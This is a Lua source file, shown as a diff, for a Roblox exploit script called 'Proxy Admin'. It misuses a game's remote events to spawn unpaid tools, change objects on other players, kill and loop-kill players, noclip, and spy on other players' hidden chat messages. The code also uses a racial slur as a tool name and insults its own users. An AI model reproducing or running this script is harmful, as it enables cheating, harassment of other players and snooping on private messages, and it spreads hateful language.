@@ -1,0 +1,2672 @@
+local ScreenGui = Instance.new("ScreenGui")
+local W1 = Instance.new("Frame")
+local TL1 = Instance.new("TextLabel")
+local Enterkey = Instance.new("TextBox")
+local exec = Instance.new("Frame")
+local execute = Instance.new("TextButton")
+local cancel = Instance.new("TextButton")
+local underline = Instance.new("Frame")
+local cmdbar = Instance.new("TextBox")
+
+ScreenGui.Parent = game.CoreGui
+
+cmdbar.Name = "cmdbar"
+cmdbar.Parent = ScreenGui
+cmdbar.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
+cmdbar.BorderColor3 = Color3.fromRGB(255, 255, 255)
+cmdbar.BorderSizePixel = 3
+cmdbar.Position = UDim2.new(-1, 0, 0.474426806, 0)
+cmdbar.Size = UDim2.new(0.200000003, 0, 0.0500000007, 0)
+cmdbar.Font = Enum.Font.SourceSansBold
+cmdbar.Text = "Type Commands Here"
+cmdbar.TextColor3 = Color3.fromRGB(255, 255, 255)
+cmdbar.TextSize = 18.000
+cmdbar.TextScaled = true
+
+W1.Name = "W1"
+W1.Parent = ScreenGui
+W1.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+W1.BorderSizePixel = 0
+W1.Position = UDim2.new(0, 0, 1, 0)
+W1.Size = UDim2.new(1, 0, 1, 0)
+
+TL1.Name = "TL1"
+TL1.Parent = W1
+TL1.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+TL1.BorderColor3 = Color3.fromRGB(26, 26, 26)
+TL1.BorderSizePixel = 3
+TL1.Position = UDim2.new(0.349452525, 0, 0.331569672, 0)
+TL1.Size = UDim2.new(0.300000012, 0, 0.100000001, 0)
+TL1.Font = Enum.Font.GothamBlack
+TL1.Text = "Proxy Admin"
+TL1.TextColor3 = Color3.fromRGB(161, 161, 161)
+TL1.TextScaled = true
+TL1.TextSize = 14.000
+TL1.TextWrapped = true
+
+Enterkey.Name = "Enterkey"
+Enterkey.Parent = W1
+Enterkey.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+Enterkey.BorderColor3 = Color3.fromRGB(255, 255, 255)
+Enterkey.BorderSizePixel = 4
+Enterkey.Position = UDim2.new(0.103102215, 0, 0.774250448, 0)
+Enterkey.Size = UDim2.new(0.800000012, 0, 0.0299999993, 0)
+Enterkey.Font = Enum.Font.SourceSansBold
+Enterkey.PlaceholderText = "Enter Key Here"
+Enterkey.Text = ""
+Enterkey.TextColor3 = Color3.fromRGB(255, 255, 255)
+Enterkey.TextScaled = true
+Enterkey.TextSize = 14.000
+Enterkey.TextWrapped = true
+Enterkey.Visible = false
+
+exec.Name = "exec"
+exec.Parent = ScreenGui
+exec.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+exec.BorderColor3 = Color3.fromRGB(46, 46, 46)
+exec.BorderSizePixel = 0
+exec.Position = UDim2.new(0.327641428, 0, -1, 0)
+exec.Size = UDim2.new(0.349999994, 0, 0.300000012, 0)
+
+execute.Name = "execute"
+execute.Parent = exec
+execute.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+execute.BackgroundTransparency = 1.000
+execute.BorderSizePixel = 0
+execute.Position = UDim2.new(0.521420956, 0, 0.351617396, 0)
+execute.Size = UDim2.new(0.400000006, 0, 0.300000012, 0)
+execute.Font = Enum.Font.GothamBlack
+execute.Text = "Execute!"
+execute.TextColor3 = Color3.fromRGB(255, 255, 255)
+execute.TextScaled = true
+execute.TextSize = 14.000
+execute.TextWrapped = true
+
+cancel.Name = "cancel"
+cancel.Parent = exec
+cancel.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+cancel.BackgroundTransparency = 1.000
+cancel.BorderSizePixel = 0
+cancel.Position = UDim2.new(0.07318189, 0, 0.351617396, 0)
+cancel.Size = UDim2.new(0.400000006, 0, 0.300000012, 0)
+cancel.Font = Enum.Font.GothamBlack
+cancel.Text = "Cancel!"
+cancel.TextColor3 = Color3.fromRGB(255, 255, 255)
+cancel.TextScaled = true
+cancel.TextSize = 14.000
+cancel.TextWrapped = true
+
+underline.Name = "underline"
+underline.Parent = exec
+underline.BackgroundColor3 = Color3.fromRGB(255, 52, 52)
+underline.BorderSizePixel = 0
+underline.Position = UDim2.new(0.0975758433, 0, 0.696202517, 0)
+underline.Size = UDim2.new(0.349999994, 0, 0.0154999997, 0)
+
+-- Scripts:
+execute.MouseButton1Down:Connect(function()
+underline:TweenPosition(UDim2.new(0.545814931, 0, 0.696202517, 0), "Out", "Bounce", 1)
+wait(1)
+cmdbar:TweenPosition(UDim2.new(0.005, 0, 0.474426806, 0), "Out", "Quint", 2)
+IDFORSPAWNER = 1554987
+local prefix = ">"
+game.Workspace.GiveTool:FireServer(1554987, "SuperFlyGoldBoombox")
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+game:GetService("StarterGui"):SetCore("SendNotification", {
+  Title = "Proxy's Admin",
+  Text = "Enjoy the admin you fat fucks",
+  Icon = "rbxassetid://1587542316"})
+cmdbar.FocusLost:connect(function(p)
+if p then 
+    if string.sub(cmdbar.Text,1,4) == "cmds" then
+		print[[--
+------------------------------------------------------------------ 
+  _____                                   _           _            
+ |  __ \                         /\      | |         (_)           
+ | |__) | __ _____  ___   _     /  \   __| |_ __ ___  _ _ __       
+ |  ___/ '__/ _ \ \/ / | | |   / /\ \ / _` | '_ ` _ \| | '_ \      
+ | |   | | | (_) >  <| |_| |  / ____ \ (_| | | | | | | | | | |  _  
+ |_|   |_|  \___/_/\_\\__, | /_/    \_\__,_|_| |_| |_|_|_| |_| (_) 
+                       __/ |                                      
+                      |___/      --Whitelist made by Nardo#0401
+				 				 --Command bar made by Nardo#0401                              
+------------------------------------------------------------------
+[1]ak --// AK47
+[2]spy --// chat spy
+[3]rj --// rejoins the server
+[4]re --// respawns you NO TAG [DO NOT USE > FOR re]
+[5]tag --// my discord tag [Only works if you have VIP]
+[6]noclip --// allows you to noclip [press "E" to toggle]
+[7]sponge --// crack head spongebob
+[8]hb --// Honey Badger carbine
+[9]glock --// gives you a glock
+[10]cloud --// gives you a cloud?? what else?
+[11]mv --// A military vehicle
+[12]illuminati --// Pretty self explanitory.
+[13]sans --// Makes you turn into a sans head
+[14]krabs --// Spawns really retarded looking Mr.Krabs
+[15]gold --// Makes you some weird golden person lol
+[16]sonic --// Tf do you think
+[17]suv --// A car. With icon texture
+[18]deagle --// A cool looking pistol
+[19]kp --// Gives you a normal sized krabby patty
+[20]iy --// FE admin script
+[21]audio --// Audio Logger
+[22]dex --// Dex Edplorer v4
+[23]green --// Makes your character green 
+[24]orange --// Maked your character orange 
+[25]purple --// Makes your character purple 
+[26]blue --// Makes your character blue 
+[27]tan --// Makes your character tan 
+[28]white --// Makes your character white 
+[29]black --// Makes your character black
+[30]ff --// Makes your character FF
+[31]mpk --// Gives you mp5k
+[32]phone --// .. tf do you think lol
+[33]crash --// Weird character that stares into your soul
+[34]policecar --// Gives you police car (Backwards, but still usable lol)
+[35]kill<plr> --// Kills the specified player
+[36]lkill<plr> --// Loopkills specified player (really fast)
+[37]unlkill --// Stops loopkill
+[38]kleg --// Gives you korblox right leg
+[39]lb --// Adds a leaderboard value
+[40]rhead --// Removes your head
+[41]sign --// A Sign that covers up Gamepass and Money
+[42]goto<plr> --// Teleports you to a player
+[43]otag --// Orange VIP tag
+[44]gtag --// Green VIP tag
+[45]rtag --// Red VIP tag
+[46]btag --// Blue VIP tag
+[47]ytag --// Yellow VIP tag
+[48]vip<plr> --// Gives a player VIP tag
+[49]text<text> --// Changes VIP tag text
+[50]katana
+]]
+	end
+
+    if string.sub(cmdbar.Text,1,5) == "ak" or string.sub(cmdbar.Text,1,6) == prefix.."proxy" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 444717798, 1587542316
+local Name, ToolTip = "BOOMER", "Pr_xyy & Nardo are gods"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://477006495")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.05,.05,.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-36.184))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.1, -0.1, 0.1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,6) == "katana" or string.sub(cmdbar.Text,1,7) == ">sword" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 584703409, 584703637
+local Name, ToolTip = "NIGGER", "Genji's Sword"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://584703409")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://584703637")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.3,.3,.3))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-36.184))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.1, -2.1, 0.1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local coronavirus = MainUserW["NIGGER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("NIGGER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("NIGGER",NIGGER,"NIGGER",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://218504594"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("NIGGER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("NIGGER",NIGGER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,3) == "spy" or string.sub(cmdbar.Text,1,4) == prefix.."spy" then
+		--This script reveals ALL hidden messages in the default chat
+--chat "/spy" to toggle!
+enabled = true
+--if true will check your messages too
+spyOnMyself = true
+--if true will chat the logs publicly (fun, risky)
+public = false
+--if true will use /me to stand out
+publicItalics = true
+--customize private logs
+privateProperties = {
+	Color = Color3.fromRGB(0,255,0); 
+	Font = Enum.Font.Antique;
+	TextSize = 22;
+}
+--////////////////////////////////////////////////////////////////
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+
+local function onChatted(p,msg)
+	if _G.chatSpyInstance == instance then
+		if p==player and msg:lower():sub(1,4)=="/spy" then
+			enabled = not enabled
+			wait(0.3)
+			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+		elseif enabled and (spyOnMyself==true or p~=player) then
+			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+			local hidden = true
+			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+					hidden = false
+				end
+			end)
+			wait(1)
+			conn:Disconnect()
+			if hidden and enabled then
+				if public then
+					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+				else
+					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+				end
+			end
+		end
+	end
+end
+
+for _,p in ipairs(Players:GetPlayers()) do
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end)
+privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+    end
+
+	if string.sub(cmdbar.Text,1,2) == "rj" or string.sub(cmdbar.Text,1,3) == prefix.."rj" then
+game:GetService("TeleportService"):Teleport(game.PlaceId, 
+game:GetService("Players").LocalPlayer)
+end
+
+	if string.sub(cmdbar.Text,1,2) == "re" or string.sub(cmdbar.Text,1,3) == prefix.."re" then
+    game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(15)
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "ptag" or string.sub(cmdbar.Text,1,5) == prefix.."ptag" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 465482937
+local texture = 465483155
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Antique")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Proxy#7430")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize",100)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15, 0, 5, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim2.new(0, -100, 0, -30))
+end
+
+	if string.sub(cmdbar.Text,1,4) == "ntag" or string.sub(cmdbar.Text,1,5) == prefix.."ntag" then
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local mesh = 465482937
+local texture = 465483155
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"),
+    players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+
+game.Workspace.GiveTool:FireServer(2187476, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Antique")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Nardo#0401")
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize",100)
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim2.new(15, 0, 5, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim2.new(0, -100, 0, -30))
+end
+
+	if string.sub(cmdbar.Text,1,5) == "black" or string.sub(cmdbar.Text,1,6) == prefix.."black" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really black"))
+	end
+    if string.sub(cmdbar.Text,1,5) == "white" or string.sub(cmdbar.Text,1,6) == prefix.."white" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("White"))
+	end
+    
+    if string.sub(cmdbar.Text,1,6) == "orange" or string.sub(cmdbar.Text,1,7) == prefix.."orange" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Deep orange"))
+	end
+    if string.sub(cmdbar.Text,1,5) == "green" or string.sub(cmdbar.Text,1,6) == prefix.."green" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Lime green"))
+	end
+    if string.sub(cmdbar.Text,1,4) == "blue" or string.sub(cmdbar.Text,1,5) == prefix.."blue" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Really blue"))
+	end
+    if string.sub(cmdbar.Text,1,6) == "purple" or string.sub(cmdbar.Text,1,7) == prefix.."purple" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Magenta"))
+	end
+    if string.sub(cmdbar.Text,1,3) == "tan" or string.sub(cmdbar.Text,1,4) == prefix.."tan" then
+		game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new("Nougat"))
+	end
+
+	if string.sub(cmdbar.Text,1,2) == "ff" or string.sub(cmdbar.Text,1,3) == prefix.."ff" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud") 
+local UserName  = game:GetService("Players").LocalPlayer.Name
+local Autoride = true 
+local Name, ToolTip = "KTOOL", "Bodymesh" 
+local CE = {}
+local Variables = {
+    workspace = game:GetService("Workspace"), 
+    players = game:GetService("Players") 
+}
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 
+
+function CE:FireEvent(ItemName, Object, Property, Value) 
+    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://") 
+
+CE:FireEvent("PompousTheCloud",MainUserW["Head"],"Material",Enum.Material.ForceField)
+CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Material",Enum.Material.ForceField)
+CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Material",Enum.Material.ForceField)
+CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Material",Enum.Material.ForceField)
+CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Material",Enum.Material.ForceField)
+CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Material",Enum.Material.ForceField)
+	end
+
+ 	if string.sub(cmdbar.Text,1,6) == "sponge" or string.sub(cmdbar.Text,1,7) == prefix.."sponge" then
+game.Workspace.GiveTool:FireServer(8216152, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430088036, 430088043
+local Name, ToolTip = "BOOMER", "Spongebob"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430088036")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430088043")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(5,5,5))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+if string.sub(cmdbar.Text,1,6) == "noclip" or string.sub(cmdbar.Text,1,7) == prefix.."noclip" then
+    noclip = false
+game:GetService('RunService').Stepped:connect(function()
+if noclip then
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+end
+end)
+plr = game.Players.LocalPlayer
+mouse = plr:GetMouse()
+mouse.KeyDown:connect(function(key)
+
+if key == "e" then
+noclip = not noclip
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
+end
+end)
+print('Loaded')
+print('Press "E" to noclip')
+    end
+
+	if string.sub(cmdbar.Text,1,2) == "hb" or string.sub(cmdbar.Text,1,3) == prefix.."hb" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 504210909, 1587542316
+local Name, ToolTip = "BOOMER", "Honey Badger"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://504210909")
